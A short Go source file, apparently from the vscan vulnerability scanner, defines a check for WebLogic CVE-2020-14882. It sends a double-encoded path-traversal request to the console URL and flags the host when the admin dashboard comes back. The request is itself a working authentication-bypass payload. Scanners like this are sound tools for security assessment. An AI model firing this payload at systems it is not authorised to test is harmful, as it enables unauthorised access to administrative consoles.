package weblogic

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func CVE_2020_14882(url string) bool {
	if req, err := pkg.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=a", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "/console/dashboard") {
			fmt.Printf("[+] Found vuln WebLogic CVE_2020_14882|%s\n", url)
			return true
		}
	}
	return false
}
